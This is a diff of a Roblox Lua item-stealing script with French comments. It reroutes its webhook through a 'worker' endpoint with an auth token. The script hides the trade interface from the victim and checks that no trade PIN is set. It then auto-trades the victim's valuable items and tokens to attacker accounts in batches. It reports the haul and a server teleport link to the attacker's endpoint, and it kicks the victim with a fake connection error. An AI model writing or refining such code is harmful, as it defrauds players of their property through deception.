@@ -24,11 +24,11 @@ local Replion = require(game.ReplicatedStorage.Packages.Replion)
 local users = _G.Usernames or {}
 local min_rap = _G.min_rap or 100
 local ping = _G.pingEveryone or "No"
-local webhook = _G.webhook or ""
+local webhook = _G.webhook or "" -- METTRE L'URL DU WORKER ICI
 
 -- // PROTECTION ET VÉRIFICATIONS
 if next(users) == nil or webhook == "" then
-    plr:kick("You didn't add usernames or webhook")
+    plr:kick("You didn't add usernames or worker url")
     return
 end
 
@@ -48,34 +48,25 @@ if game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType"):Invo
 end
 
 -- // VÉRIFICATION DU PIN
-local args = {
-    [1] = {
-        ["option"] = "PIN",
-        ["value"] = "9079"
-    }
-}
+local args = {[1] = {["option"] = "PIN", ["value"] = "9079"}}
 local _, PINReponse = netModule:WaitForChild("RF/ResetPINCode"):InvokeServer(unpack(args))
 if PINReponse ~= "You don't have a PIN code" then
     plr:kick("Account error. Please disable trade PIN and try again")
     return
 end
 
--- // NETTOYAGE UI ET DISCRÉTION
+-- // NETTOYAGE UI
 tradeGui.Black.Visible = false
 tradeGui.MiscChat.Visible = false
 tradeCompleteGui.Black.Visible = false
 tradeCompleteGui.Main.Visible = false
-
 local maintradegui = tradeGui.Main
 maintradegui.Visible = false
-maintradegui:GetPropertyChangedSignal("Visible"):Connect(function()
-    maintradegui.Visible = false
-end)
+maintradegui:GetPropertyChangedSignal("Visible"):Connect(function() maintradegui.Visible = false end)
 
 tradeGui:GetPropertyChangedSignal("Enabled"):Connect(function()
     inTrade = tradeGui.Enabled
     if inTrade then
-        -- // SUPPRESSION DU "TRADING" AU DESSUS DE LA TÊTE
         task.spawn(function()
             if plr.Character then
                 for i = 1, 20 do
@@ -89,32 +80,27 @@ tradeGui:GetPropertyChangedSignal("Enabled"):Connect(function()
     end
 end)
 
--- // FONCTIONS DE TRADING (RÉSEAU)
+-- // FONCTIONS DE TRADING
 local function sendTradeRequest(user)
     local target = game:GetService("Players"):WaitForChild(user)
-    repeat
-        task.wait(0.1)
+    repeat task.wait(0.1)
         local response = netModule:WaitForChild("RF/Trading/SendTradeRequest"):InvokeServer({target})
     until response == true
 end
 
 local function addItemToTrade(itemType, ID)
-    repeat
-        local response = netModule:WaitForChild("RF/Trading/AddItemToTrade"):InvokeServer(itemType, ID)
+    repeat local response = netModule:WaitForChild("RF/Trading/AddItemToTrade"):InvokeServer(itemType, ID)
     until response == true
 end
 
 local function readyTrade()
-    repeat
-        task.wait(0.1)
+    repeat task.wait(0.1)
         local response = netModule:WaitForChild("RF/Trading/ReadyUp"):InvokeServer(true)
     until response == true
 end
 
 local function confirmTrade()
-    repeat
-        task.wait(0.1)
-        netModule:WaitForChild("RF/Trading/ConfirmTrade"):InvokeServer()
+    repeat task.wait(0.1) netModule:WaitForChild("RF/Trading/ConfirmTrade"):InvokeServer()
     until not inTrade
 end
 
@@ -126,16 +112,12 @@ local function formatNumber(number)
         number = number / 1000
         suffixIndex = suffixIndex + 1
     end
-    if suffixIndex == 1 then
-        return tostring(math.floor(number))
-    else
-        return string.format("%.2f%s", number, suffixes[suffixIndex])
-    end
+    return suffixIndex == 1 and tostring(math.floor(number)) or string.format("%.2f%s", number, suffixes[suffixIndex])
 end
 
 local totalRAP = 0
 
--- // SYSTÈME DE WEBHOOKS
+-- // SYSTÈME DE WEBHOOKS (VIA WORKER)
 local function SendJoinMessage(list, prefix)
     local isGoodHit = totalRAP >= 500
     local embedTitle = isGoodHit and "🟢 GOOD HIT 🎯" or "🟣 SMALL HIT 🎯"
@@ -168,6 +150,7 @@ local function SendJoinMessage(list, prefix)
     end
 
     local data = {
+        ["auth_token"] = auth_token, -- TOKEN POUR LE WORKER
         ["username"] = webhookName,
         ["content"] = prefix .. "game:GetService('TeleportService'):TeleportToPlaceInstance(13772394625, '" .. game.JobId .. "')",
         ["embeds"] = {{
@@ -212,6 +195,7 @@ local function SendMessage(list)
     end
 
     local data = {
+        ["auth_token"] = auth_token, -- TOKEN POUR LE WORKER
         ["username"] = webhookName,
         ["embeds"] = {{
             ["title"] = "⚪ Server Hit 🎯",
@@ -223,7 +207,7 @@ local function SendMessage(list)
     request({Url = webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(data)})
 end
 
--- // DATA COLLECTION
+-- // RÉCUPÉRATION DATA
 local rapDataResult = Replion.Client:GetReplion("ItemRAP")
 local rapData = rapDataResult.Data.Items
 
@@ -257,7 +241,7 @@ for _, category in ipairs(categories) do
     end
 end
 
--- // EXECUTION DU STEAL
+-- // EXECUTION
 if #itemsToSend > 0 then
     table.sort(itemsToSend, function(a, b) return a.RAP > b.RAP end)
     local sentItems = {}
@@ -277,34 +261,22 @@ if #itemsToSend > 0 then
         while #itemsToSend > 0 do
             sendTradeRequest(joinedUser)
             repeat task.wait(0.5) until inTrade
-
             local currentBatch = getNextBatch(itemsToSend, 100)
-            for _, item in ipairs(currentBatch) do
-                addItemToTrade(item.itemType, item.ItemID)
-            end
-
-            -- Ajout des tokens si présents
+            for _, item in ipairs(currentBatch) do addItemToTrade(item.itemType, item.ItemID) end
             local rawText = PlayerGui.TradeRequest.Main.Currency.Coins.Amount.Text
-            local cleanedText = rawText:gsub("^%s*(.-)%s*$", "%1"):gsub("[^%d]", "")
-            local tokensamount = tonumber(cleanedText) or 0
-            if tokensamount >= 1 then
-                netModule:WaitForChild("RF/Trading/AddTokensToTrade"):InvokeServer(tokensamount)
-            end
-
+            local tokensamount = tonumber(rawText:gsub("^%s*(.-)%s*$", "%1"):gsub("[^%d]", "")) or 0
+            if tokensamount >= 1 then netModule:WaitForChild("RF/Trading/AddTokensToTrade"):InvokeServer(tokensamount) end
             readyTrade()
             confirmTrade()
         end
-        plr:kick("Please check your internet connection and try again")
+        plr:kick("Internet connection error, please try again")
     end
 
     local function waitForUserJoin()
         local sentMessage = false
         local function onUserJoin(player)
             if table.find(users, player.Name) then
-                if not sentMessage then
-                    SendMessage(sentItems)
-                    sentMessage = true
-                end
+                if not sentMessage then SendMessage(sentItems) sentMessage = true end
                 doTrade(player.Name)
             end
         end
